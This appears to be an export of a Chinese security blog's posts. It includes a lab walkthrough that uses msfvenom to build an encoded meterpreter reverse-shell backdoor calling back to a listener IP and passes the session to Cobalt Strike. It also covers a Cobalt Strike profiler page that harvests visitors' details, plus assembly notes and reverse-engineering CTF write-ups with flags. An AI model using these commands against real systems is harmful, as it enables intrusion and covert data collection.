        <content type="html"><![CDATA[<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>kali机开启CS服务器<br><img src="https://www.z4a.net/images/2024/01/03/1.png" alt="1.png"></p><p>Win10开启msf、CS客户端<br><img src="https://www.z4a.net/images/2024/01/03/2.png" alt="2.png"><br><img src="https://www.z4a.net/images/2024/01/03/3.png" alt="3.png"></p><p>Win7充当一台靶机<br><img src="https://www.z4a.net/images/2024/01/03/4.png" alt="4.png"></p><h3 id="第一步-利用msfvenom生成后门，并且上传到靶机让其执行，获得meterpreter"><a href="#第一步-利用msfvenom生成后门，并且上传到靶机让其执行，获得meterpreter" class="headerlink" title="第一步.利用msfvenom生成后门，并且上传到靶机让其执行，获得meterpreter"></a>第一步.利用msfvenom生成后门，并且上传到靶机让其执行，获得meterpreter</h3><p>生成后门(路径就是当前路径了，就在桌面)</p><p>命令：msfvenom -a x86 –platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.21.125.215 LPORT&#x3D;4444 -e x86&#x2F;shikata_ga_nai -b ‘\x00\x0a\xff’ -i 10 -f exe -o payload.exe<br><img src="https://www.z4a.net/images/2024/01/03/5.png" alt="5.png"></p><p>然后把payload.exe上传到win7里面(可以用python开一个服务传递，命令 python -m http.server 端口号，我这里直接上传了)<br><img src="https://www.z4a.net/images/2024/01/03/6.png" alt="6.png"></p><p>利用msf得到meterpreter<br><img src="https://www.z4a.net/images/2024/01/03/7.png" alt="7.png"></p><p>开启监听<br><img src="https://www.z4a.net/images/2024/01/03/8.png" alt="8.png"></p><p>靶机运行payload.exe，即得到meterpreter<br><img src="https://www.z4a.net/images/2024/01/03/9.png" alt="9.png"></p><h3 id="第二步-设置msf，达到与CobaltStrike连接"><a href="#第二步-设置msf，达到与CobaltStrike连接" class="headerlink" title="第二步.设置msf，达到与CobaltStrike连接"></a>第二步.设置msf，达到与CobaltStrike连接</h3><p>先让meterpreter进入后台模式<br><img src="https://www.z4a.net/images/2024/01/03/10.png" alt="10.png"></p><p>然后加载msf的payload注入功能 (use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject)，并且设置payload（set payload windows&#x2F;meterpreter&#x2F;reverse_http)，注意这里末尾是reverse_http<br><img src="https://www.z4a.net/images/2024/01/03/11.png" alt="11.png"></p><p>然后设置参数<br><a href="https://www.z4a.net/image/jA25qw"><img src="https://www.z4a.net/images/2024/01/03/12.png" alt="12.png"></a></p><p><a href="https://www.z4a.net/image/jA2KmN"><img src="https://www.z4a.net/images/2024/01/03/13.png" alt="13.png"></a></p><p>run<br><img src="https://www.z4a.net/images/2024/01/03/14.png" alt="14.png"></p><p>然后设置CS客户端<br><img src="https://www.z4a.net/images/2024/01/03/15.png" alt="15.png"><br><img src="https://www.z4a.net/images/2024/01/03/16.png" alt="16.png"><br><img src="https://www.z4a.net/images/2024/01/03/17.png" alt="17.png"></p><p>如果没有上线，可以在msf中多run几次</p>]]></content>
      
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VS2019 无法打开源文件“stdafx.h“ 问题</title>
      <link href="/2022/09/15/VS2019-%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E6%BA%90%E6%96%87%E4%BB%B6%E2%80%9Cstdafx-h%E2%80%9C-%E9%97%AE%E9%A2%98/"/>
      <url>/2022/09/15/VS2019-%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E6%BA%90%E6%96%87%E4%BB%B6%E2%80%9Cstdafx-h%E2%80%9C-%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>我的做法是下载一个stdafx.h文件</p><p><a href="http://www.downyi.com/downinfo/42733.html">http://www.downyi.com/downinfo/42733.html</a></p><p>下载解压后，找到StdAfx.h的位置<br>我的是<br><img src="https://www.z4a.net/images/2024/01/03/132fd6a86ce60868c.png" alt="132fd6a86ce60868c.png"></p><p>在VS2019里打开项目，点击 项目 -&gt; 属性 -&gt; C&#x2F;C++下面的常规 -&gt; 附加包含目录</p><p>然后在里面添加StdAfx.h的位置<br><img src="https://www.z4a.net/images/2024/01/03/2e8b3ce47df6fcaed.png" alt="2e8b3ce47df6fcaed.png"></p><p>最后点击确定</p>]]></content>
      
      
      
        <tags>
            
            <tag> 常见问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike之信息收集</title>
      <link href="/2022/08/23/CobaltStrike%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2022/08/23/CobaltStrike%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>CobalitStrike简称CS，是一个渗透测试的利器，它可以被分为一个服务端和多个客户端，所以可以被用来团队协同操作。它集成了端口转发、端口扫描、提权、钓鱼、远控木马等功能，该工具几乎覆盖了APT攻击链中所需要用到的各个技术环节。感觉像是一个图形化版的msf。</p><h3 id="目标主机信息收集"><a href="#目标主机信息收集" class="headerlink" title="目标主机信息收集"></a>目标主机信息收集</h3><p>准备工作，先打开CS服务端<br><img src="https://www.z4a.net/images/2024/01/03/1f0ec62a952c3299e.png" alt="1f0ec62a952c3299e.png"><br>再打开客户端，我是在win10下打开的客户端</p><p>先用cmd打开CobaltStrike的目录，输入java -jar cobaltstrike.jar(注意jdk需要在11以上)，然后弹出登录框<br><img src="https://www.z4a.net/images/2024/01/03/255f5cd29cfcb7c93.png" alt="255f5cd29cfcb7c93.png"><br>然后成功进入<br><img src="https://www.z4a.net/images/2024/01/03/36f41c80a55bf9f29.png" alt="36f41c80a55bf9f29.png"><br>然后开始信息收集，选择如下模块<br><img src="https://www.z4a.net/images/2024/01/03/42cc84d0234f4c58f.png" alt="42cc84d0234f4c58f.png"><br>然后输入对应的信息，注意一下，这里的Local URI+Local Host最终形成的是192.168.200.139&#x2F;dzh，端口号为85(只要不和当前服务器端口号冲突就行)</p><p>最后的Redirect URL就是访问完你的192.168.200.139&#x2F;dzh之后需要跳转的网页<br><img src="https://www.z4a.net/images/2024/01/03/566154a2d758e98c5.png" alt="566154a2d758e98c5.png"><br>点击Launch<br><img src="https://www.z4a.net/images/2024/01/03/6eb89388f8b1b9cbb.png" alt="6eb89388f8b1b9cbb.png"><br>也可以在如下模块看见自己创建的<br><img src="https://www.z4a.net/images/2024/01/03/73f61d5d0e9ae7eec.png" alt="73f61d5d0e9ae7eec.png"><br><img src="https://www.z4a.net/images/2024/01/03/86e024ef8446aaed3.png" alt="86e024ef8446aaed3.png"><br>然后如果有人访问这个网页，他的信息就会被你收集到</p><p>试试访问一下<br><img src="https://www.z4a.net/images/2024/01/03/977228bc59de58c0a.png" alt="977228bc59de58c0a.png"><br>开始访问的是192.168.200.139&#x2F;dzh，然后最后跳转到了192.168.200.139&#x2F;cjy，因为跳转的网页不存在，所以显示无法访问</p><p>回到CS,查看收集到了什么信息<br><img src="https://www.z4a.net/images/2024/01/03/103e93ead7a9188f9f.png" alt="103e93ead7a9188f9f.png"><br><img src="https://www.z4a.net/images/2024/01/03/1140f6aab574bbadc5.png" alt="1140f6aab574bbadc5.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言 实验8 分析一个奇怪的程序</title>
      <link href="/2022/04/03/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E5%AE%9E%E9%AA%8C8-%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%AA%E5%A5%87%E6%80%AA%E7%9A%84%E7%A8%8B%E5%BA%8F/"/>
      <url>/2022/04/03/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E5%AE%9E%E9%AA%8C8-%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%AA%E5%A5%87%E6%80%AA%E7%9A%84%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>开始看了很久，感觉应该是不能正常返回的，但经过看前文和向老师提问，最后可以理解这个程序了。下面我将分享我对这个实验8的理解。<br>程序的进入肯定是start，一开始你会发现两个nop指令，你可以把它理解为什么都不做，但是会占用执行一个指令的时间，然后就是将s2处的初始指令复制到s处的操作了，先将di,si分别存储s，s2的偏移地址，然后利用ax作为中介，将s2处的指令复制到s处。mov cs:[di],ax这个操作大家一定要看懂，要看懂ax里面到底存储的什么，这个就是这个实验的关键之处。我们先看，s2处的指令，jmp short s1，大家都应该知道jmp这个操作，在cpu里面，是没有目的地址这个数据的，只有转移的位移，位移怎么计算呢？以jmp short s1为列子： 位移&#x3D;s1处的地址 - (jmp short s1)下一个指令的地址<br><img src="https://www.z4a.net/images/2024/01/03/12230a3dafedfe801.png" alt="12230a3dafedfe801.png"></p><p>这个实验里面位移 &#x3D; s1的地址(076A:0018) - (jmp short s1)后一个指令的地址(076A:0022) ，计算结果为-A,也是10进制的-10，但是cpu里面存储的数据都是以补码的形式出现的，所以我们应该将-10转化为补码形式，大家知道怎么转换吗？不知道的看这里，有一个结论，正数的补码取反加一就是其对应负数的补码，10的二进制表示为00001010，取反加一之后就是11110110，这就是-10的补码11110110，再转化为16进制就是F6。也可以看到上面图片的EB F6。</p><p>执行mov cs:[di],ax之后，程序进入s0执行jmp short s，就是跳回原处。但是现在的s处开始的指令已经改变了，以前开始的指令是nop<br><img src="https://www.z4a.net/images/2024/01/03/228ef64c5fc2f2bea.png" alt="228ef64c5fc2f2bea.png"></p><p>但是现在就是刚刚复制的EB F6,一个nop 指令占一个字节，但是EB F6占两个字节，所以EB F6会将之前的两个nop 覆盖掉。<br><img src="https://www.z4a.net/images/2024/01/03/3101d3b084a5a5012.png" alt="3101d3b084a5a5012.png"></p><p>所以，你跳转到s，s执行的指令是EB F6，也就是执行从EB F6 的下一个指令mov di，offset s开始，向前跳10个字节(负数肯定是向前跳)<br>很巧的是，从下一个指令开始向前跳10个字节，恰好是mov ax,4c00H,也就是说程序可以正常返回。<br><img src="https://www.z4a.net/images/2024/01/03/4c0d1b0b585cf6515.png" alt="4c0d1b0b585cf6515.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-Reverse的Reverse1-内涵的软件</title>
      <link href="/2021/04/16/BUU-Reverse%E7%9A%84Reverse1-%E5%86%85%E6%B6%B5%E7%9A%84%E8%BD%AF%E4%BB%B6/"/>
      <url>/2021/04/16/BUU-Reverse%E7%9A%84Reverse1-%E5%86%85%E6%B6%B5%E7%9A%84%E8%BD%AF%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>Reverse1<br>查看它是多少位的<br><img src="https://www.z4a.net/images/2024/01/03/1b073a0afb7d0c32a.png" alt="1b073a0afb7d0c32a.png"></p><p>64位<br>然后选择64位的ida<br>进入后，首先会出现图片式的代码，按空格即可转化<br>进入ida后，直接查看字符串<br>看到flag似乎藏在其中<br><img src="https://www.z4a.net/images/2024/01/03/2ea155485f5200415.png" alt="2ea155485f5200415.png"></p><p>选择其中一个，比如input the flag<br>进入选择它的函数(黄色的)<br><img src="https://www.z4a.net/images/2024/01/03/3c2f0754ccf243c1d.png" alt="3c2f0754ccf243c1d.png"></p><p>再按X，选择OK<br>之后就可以看到它的汇编语言<br><img src="https://www.z4a.net/images/2024/01/03/47fddb20c45c3d7b1.png" alt="47fddb20c45c3d7b1.png"></p><p>其中一段<br><img src="https://www.z4a.net/images/2024/01/03/5b47c2015502a38a9.png" alt="5b47c2015502a38a9.png"></p><p>再按f5，转化伪代码，这里是c语言<br><img src="https://www.z4a.net/images/2024/01/03/640c6aa8022364d08.png" alt="640c6aa8022364d08.png"></p><p>我们看到这里<br><img src="https://www.z4a.net/images/2024/01/03/74d956060dfc9fd1a.png" alt="74d956060dfc9fd1a.png"></p><p>这里有ASCLL的变化，把o换成了0；<br>再看，如果输入的str1与str2相等，即可得flag，我们就看str2，点击flag2<br><img src="https://www.z4a.net/images/2024/01/03/81f772d8c1599ed21.png" alt="81f772d8c1599ed21.png"></p><p>则只需要把str2中的o换成0即可。<br>所以flag为{hell0_w0rld}</p><p>第二题 Reverse2<br>先查看它的位数<br>再打开ida,查看字符串(shift+f12)<br><img src="https://www.z4a.net/images/2024/01/03/967dea056cf38f4e1.png" alt="967dea056cf38f4e1.png"></p><p>任意选择一个，比如this is the right flag<br><img src="https://www.z4a.net/images/2024/01/03/10f6e577dafed4888d.png" alt="10f6e577dafed4888d.png"></p><p>选择黄颜色的，按X，再选中一段汇编代码按f5可得下图<br><img src="https://www.z4a.net/images/2024/01/03/115d9021ee9d238617.png" alt="115d9021ee9d238617.png"><br><img src="https://www.z4a.net/images/2024/01/03/1277fe0539f435a8f0.png" alt="1277fe0539f435a8f0.png"><br>很明显红色部分有改动<br>查看ASCLL码，知道把i和r改成了1<br>再看，输入的s2和flag相等才可<br>所以我们要查看flag<br><img src="https://www.z4a.net/images/2024/01/03/13a32af9614c27ac1c.png" alt="13a32af9614c27ac1c.png"><br>答案由2个部分组成。<br>7Bh是16进制的ASCLL码，对应的是”{“,<br>再看下部分，”hacking_for_fun},我们还要把其中的i和r换成1<br>最后得flag&#x3D;{hack1ng_fo1_fun}</p><p>第三题 内涵的软件<br>查看位数<br><img src="https://www.z4a.net/images/2024/01/03/14ba9fcca37c8d84c1.png" alt="14ba9fcca37c8d84c1.png"><br>32位，选择32位的ida<br>打开后仍然先查看字符串<br>然后看到疑似答案的区域<br><img src="https://www.z4a.net/images/2024/01/03/156d875f88268a72ab.png" alt="156d875f88268a72ab.png"><br>随便点击一个，比如”那没办法了”（其实那个DBAPP里面的内容很像flag)<br>选择它的函数，再按X，进入汇编代码后，选择一段，按f5,即可得到它的伪代码，和上面的题是一样的。<br>我们直接看它的伪代码<br><img src="https://www.z4a.net/images/2024/01/03/163bb7f33a19e5c431.png" alt="163bb7f33a19e5c431.png"><br>分析下图<br><img src="https://www.z4a.net/images/2024/01/03/1784be3671db8afa31.png" alt="1784be3671db8afa31.png"><br>难道输入V4真的会出现答案吗？<br>当V4&#x3D;Y时，会有一个输出，但是这个输出真的是答案吗？<br><img src="https://www.z4a.net/images/2024/01/03/18.png" alt="18.png"><br>先看打印的东西，点击printf()里面的内容，你会看到打印的是<br><img src="https://www.z4a.net/images/2024/01/03/19.png" alt="19.png"></p><p>很明显不是答案。<br>再看看result;点击sub_40100A()，进去了之后还要点一次才可出现函数<br>你会发现，它是这样的一个函数<br><img src="https://www.z4a.net/images/2024/01/03/20.png" alt="20.png"></p><p>答案也不会是从0加到5亿。</p><p>再看看V4&#x3D;N时，会打印一个asc_425034,点击以看，会输出“那没办法了”<br>最终也会返回那个从0加到5亿的值。<br><img src="https://www.z4a.net/images/2024/01/03/21.png" alt="21.png"></p><p>很明显，这些都不是答案，其实，你只需要对输入框里一输就知道了<br>但其实答案已经很明显了。<br><img src="https://www.z4a.net/images/2024/01/03/22.png" alt="22.png"><br>只能是它了<br><img src="https://www.z4a.net/images/2024/01/03/23.png" alt="23.png"><br>所以flag&#x3D;{49d3c93df25caad81232130f3d2ebfad}。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-Reverse:第一题：easyre</title>
      <link href="/2021/04/13/BUU-Reverse-%E7%AC%AC%E4%B8%80%E9%A2%98%EF%BC%9Aeasyre/"/>
      <url>/2021/04/13/BUU-Reverse-%E7%AC%AC%E4%B8%80%E9%A2%98%EF%BC%9Aeasyre/</url>
      
        <content type="html"><![CDATA[<p>首先，下载好压缩包，并查看它是多少位.<br><img src="https://www.z4a.net/images/2024/01/03/13e817afeca910200.png" alt="13e817afeca910200.png"></p><p>由图可以知道，是64位的<br>所以我们用64位的ida来查看反汇编。<br>下图是输入文件<br><img src="https://www.z4a.net/images/2024/01/03/2f87badaa52f1ffde.png" alt="2f87badaa52f1ffde.png"></p><p>下图为汇编代码的图表形式<br><img src="https://www.z4a.net/images/2024/01/03/39e2925fb27eb55f5.png" alt="39e2925fb27eb55f5.png"><br>可以通过按空格来转化形式<br>如下图所示<br><img src="https://www.z4a.net/images/2024/01/03/48345baf2454a922a.png" alt="48345baf2454a922a.png"><br>由于此题比较容易，我们shift+f12查看字符串可得出flag<br><img src="https://www.z4a.net/images/2024/01/03/56998e7b638f3fb3e.png" alt="56998e7b638f3fb3e.png"><br>最后得到下图<br><a href="https://www.z4a.net/image/jAVh6C"><img src="https://www.z4a.net/images/2024/01/03/6de758ed3a2317188.png" alt="6de758ed3a2317188.png"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
